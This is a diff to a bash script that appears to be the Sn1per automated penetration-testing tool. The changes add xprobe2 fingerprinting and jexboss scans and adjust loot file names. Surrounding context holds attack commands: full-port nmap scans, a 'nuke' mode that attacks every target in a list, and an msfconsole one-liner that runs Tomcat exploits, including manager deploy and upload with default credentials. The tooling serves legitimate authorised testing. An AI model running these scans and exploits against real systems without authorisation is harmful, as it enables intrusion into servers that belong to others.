@@ -89,7 +89,7 @@ fi
 
 if [ "$MODE" = "stealth" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		./sniper $TARGET $MODE | tee ./loot/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
 		exit
 	fi
 	echo -e "$OKRED                ____               $RESET"
@@ -150,17 +150,20 @@ if [ "$MODE" = "stealth" ]; then
 	echo ""
 	echo -e "$OKGREEN################################### Running passive scans #########################$RESET"
 	unicornscan $TARGET 2> /dev/null
+	xprobe2 $TARGET
 	wafw00f http://$TARGET
 	whatweb http://$TARGET
 	xsstracer $TARGET 80
 	sslscan --no-failed $TARGET
 	cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg
+	echo -e "$OKGREEN################################### Done! #########################################$RESET"
+	clear
 	exit
 fi
 
 if [ "$MODE" = "airstrike" ]; then
 	if [ "$OPT1" = "report" ]; then
-		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+		./sniper $TARGET $MODE | tee ./loot/sniper-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
 		exit
 	fi
 	echo -e "$OKRED                ____               $RESET"
@@ -217,11 +220,15 @@ if [ "$MODE" = "airstrike" ]; then
 		echo ""
 		echo -e "$OKGREEN################################### Running passive scans #########################$RESET"
 		unicornscan $a 2> /dev/null
+		xprobe2 $TARGET
 		wafw00f http://$a
 		whatweb http://$a
 		xsstracer $a 80
 		sslscan --no-failed $a
 		cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg
+		echo -e "$OKGREEN################################### Done! #########################################$RESET"
+		clear
+		exit
 	done;
 	exit
 fi
@@ -265,6 +272,7 @@ if [ "$MODE" = "nuke" ]; then
 		echo -e "$OKRED --------------------------------------------------------- $RESET"
 		echo -e "$OKGREEN + -- --=[WARNING! Nuking ALL target! $RESET"
 		./sniper $a
+		clear
 	done
 fi
 
@@ -281,6 +289,7 @@ echo -e "$RESET"
 echo -e "$OKGREEN################################### Running recon #################################$RESET"
 nslookup $TARGET
 host $TARGET
+xprobe2 $TARGET
 if [ $SCAN_TYPE == "DOMAIN" ];
 then
 	dig -x $TARGET
@@ -302,7 +311,7 @@ if [ -z "$OPT1" ]; then
 	nmap -sS -sV -T4 -A -O -p 1-65535 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
 	nmap -sU -sV -T4 -A -O -p U:53,U:67,U:68,U:88,U:161,U:162,U:137,U:138,U:139,U:389,U:520,U:2049 --open $TARGET
 elif [ "$OPT1" == "web" ]; then
-	nmap -sS -sV -T4 -A -O -p 80,443 --open $TARGET -oX $LOOT_DIR/nmap-web-$TARGET.xml
+	nmap -sS -sV -T4 -A -O -p 80,443 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
 else
 	nmap -sS -sV -T4 -A -O -p $OPT1 --open $TARGET -oX $LOOT_DIR/nmap-$TARGET.xml
 	nmap -sU -sV -T4 -A -O -p U:$OPT1 --open $TARGET
@@ -821,6 +830,8 @@ else
 	nmap -p 8080 --script=*proxy* $TARGET
 	#arachni http://$TARGET:8080 --output-only-positives
 	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
+	python jexboss/jexboss.py http://$TARGET:8080
+	python jexboss/jexboss.py https://$TARGET:8080
 fi
 
 if [ -z "$port_8180" ]
